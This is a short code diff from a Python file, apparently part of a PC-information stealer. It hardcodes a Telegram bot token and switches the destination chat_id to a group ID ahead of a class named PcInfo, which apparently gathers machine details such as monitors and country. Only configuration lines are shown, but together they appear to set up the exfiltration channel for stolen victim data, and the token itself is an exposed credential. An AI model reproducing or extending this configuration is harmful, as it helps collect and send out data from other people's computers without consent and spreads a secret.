@@ -17,7 +17,7 @@ from screeninfo import get_monitors
 import pycountry
 
 bot_token = '7463062603:AAEAGU-e9d-4-UrDeLWMHeKYn5hKdhk5SLc'
-chat_id = '7944440933'
+chat_id = '-1002408191237'
 
 class PcInfo:
     def __init__(self):
